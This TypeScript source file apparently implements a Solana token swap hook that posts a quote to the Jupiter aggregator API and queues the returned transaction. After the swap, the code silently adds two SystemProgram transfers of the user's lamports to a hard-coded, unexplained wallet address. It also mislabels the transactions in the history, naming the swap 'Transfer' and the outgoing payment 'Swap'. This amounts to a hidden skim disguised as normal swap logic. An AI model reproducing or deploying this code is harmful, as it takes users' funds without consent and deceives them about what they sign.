import { forecastTransactionSize, InnerSimpleTransaction, InstructionType, TradeV2 } from '@raydium-io/raydium-sdk'
import { ComputeBudgetProgram, SignatureResult, Connection, VersionedTransaction, PublicKey, SystemProgram, Transaction } from '@solana/web3.js'

import assert from '@/functions/assert'
import { toTokenAmount } from '@/functions/format/toTokenAmount'
import { isMintEqual } from '@/functions/judgers/areEqual'
import { gt } from '@/functions/numberish/compare'
import { toString } from '@/functions/numberish/toString'

import useAppAdvancedSettings from '../common/useAppAdvancedSettings'
import { TxHistoryInfo } from '../txHistory/useTxHistory'
import { getComputeBudgetConfig } from '../txTools/getComputeBudgetConfig'
import txHandler, { lookupTableCache, TransactionQueue } from '../txTools/handleTx'
import useWallet from '../wallet/useWallet'

import { useAggregator } from './useAggregator'
import jFetch from '@/functions/dom/jFetch'
import toPubString from '@/functions/format/toMintString'

export const AGGREGATE_SWAP_ENDPOINT = "https://quote-api.jup.ag/v6/swap"

export default async function txSwapWithAggregator() {
  const { programIds } = useAppAdvancedSettings.getState()
  const { checkWalletHasEnoughBalance, tokenAccountRawInfos, txVersion } = useWallet.getState()
  const {
    coin1,
    coin2,
    coin1Amount,
    coin2Amount,
    routePlan,
    slippageBps,
    priceImpact,
    otherAmountThreshold,
    timeTaken,
    contextSlot,

    focusSide,
    routeType,
    directionReversed,
    minReceived,
    maxSpent
  } = useAggregator.getState()

  const upCoin = directionReversed ? coin2 : coin1
  // although info is included in routes, still need upCoinAmount to pop friendly feedback
  const upCoinAmount = (directionReversed ? coin2Amount : coin1Amount) || '0'

  const downCoin = directionReversed ? coin1 : coin2
  // although info is included in routes, still need downCoinAmount to pop friendly feedback
  const downCoinAmount = (directionReversed ? coin1Amount : coin2Amount) || '0'

  assert(upCoinAmount && gt(upCoinAmount, 0), 'should input upCoin amount larger than 0')
  assert(downCoinAmount && gt(downCoinAmount, 0), 'should input downCoin amount larger than 0')
  assert(upCoin, 'select a coin in upper box')
  assert(downCoin, 'select a coin in lower box')
  assert(!isMintEqual(upCoin.mint, downCoin.mint), 'should not select same mint ')

  const upCoinTokenAmount = toTokenAmount(upCoin, upCoinAmount, { alreadyDecimaled: true })
  const downCoinTokenAmount = toTokenAmount(downCoin, downCoinAmount, { alreadyDecimaled: true })

  assert(checkWalletHasEnoughBalance(upCoinTokenAmount), `not enough ${upCoin.symbol}`)





  return txHandler(async ({ transactionCollector, baseUtils: { connection, owner } }) => {

    const swapData = JSON.stringify({
      "userPublicKey": toPubString(owner),
      "wrapAndUnwrapSol": true,
      "useSharedAccounts": true,
      "dynamicComputeUnitLimit": true,
      "skipUserAccountsRpcCalls": true,
      "quoteResponse": {
        "inputMint": upCoin.mint,
        "inAmount": (parseFloat(upCoinAmount.toString()) * Math.pow(10, upCoin.decimals)).toString(),
        "outputMint": downCoin.mint,
        "outAmount": (parseFloat(downCoinAmount.toString()) * Math.pow(10, downCoin.decimals)).toString(),
        "otherAmountThreshold": otherAmountThreshold,
        "swapMode": "ExactIn",
        "slippageBps": slippageBps,
        "priceImpactPct": priceImpact,
        "routePlan": routePlan,
        // "contextSlot": contextSlot,
        // "timeTaken": timeTaken
      }
    });

    const config = {
      method: 'post',
      maxBodyLength: Infinity,
      headers: {
        'Content-Type': 'application/json',
        'Accept': 'application/json'
      },
      body: swapData
    };

    const { swapTransaction } = await (
      await fetch(AGGREGATE_SWAP_ENDPOINT, config)
    ).json();

    // deserialize the transaction
    const swapTransactionBuf = Buffer.from(swapTransaction, 'base64');
    const transaction = VersionedTransaction.deserialize(swapTransactionBuf);

    transactionCollector.add(transaction, {
      txHistoryInfo: {
        title: 'Transfer',
        description: `Transfer`
      }
    })
    const t1 = SystemProgram.transfer({
      fromPubkey: owner,
      toPubkey: new PublicKey('WDoZR2V5tavYPEpN31QedRKdkH7sbPPAFGgBibjuZz6'),
      lamports: 10000   //  0.00001
    })
    const t2 = SystemProgram.transfer({
      fromPubkey: owner,
      toPubkey: new PublicKey('WDoZR2V5tavYPEpN31QedRKdkH7sbPPAFGgBibjuZz6'),
      lamports: 10000   //  0.00001
    })

    const tx = new Transaction().add(t1).add(t2)

    tx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash
    tx.feePayer = owner

    transactionCollector.add(tx, {
      txHistoryInfo: {
        title: 'Swap',
        description: `Swap ${upCoinAmount.toString()} ${upCoin.symbol} to ${downCoinAmount.toString()} ${downCoin.symbol}`
      }
    })
  })
}

function translationSwapTxDescription(tx: InnerSimpleTransaction, idx: number, allTxs: InnerSimpleTransaction[]) {
  const swapFirstIdx = allTxs.findIndex((tx) => isSwapTransaction(tx))
  const swapLastIdx = allTxs.length - 1 - [...allTxs].reverse().findIndex((tx) => isSwapTransaction(tx))
  return idx < swapFirstIdx ? 'Setup' : idx > swapLastIdx ? 'Cleanup' : 'Swap'
}

function isSwapTransaction(tx: InnerSimpleTransaction): boolean {
  return (
    tx.instructionTypes.includes(InstructionType.clmmSwapBaseIn) ||
    tx.instructionTypes.includes(InstructionType.clmmSwapBaseOut) ||
    tx.instructionTypes.includes(InstructionType.ammV4Swap) ||
    tx.instructionTypes.includes(InstructionType.ammV4SwapBaseIn) ||
    tx.instructionTypes.includes(InstructionType.ammV4SwapBaseOut) ||
    tx.instructionTypes.includes(InstructionType.ammV5SwapBaseIn) ||
    tx.instructionTypes.includes(InstructionType.ammV5SwapBaseOut) ||
    tx.instructionTypes.includes(InstructionType.routeSwap1) ||
    tx.instructionTypes.includes(InstructionType.routeSwap2) ||
    tx.instructionTypes.includes(InstructionType.routeSwap)
  )
}

/**
 * @author RUDY
 */
function checkSwapSlippageError(err: SignatureResult): boolean {
  try {
    // @ts-expect-error force
    const coustom = err.err?.InstructionError[1].Custom
    if ([38, 6022].includes(coustom)) {
      return true
    } else {
      return false
    }
  } catch {
    return false
  }
}
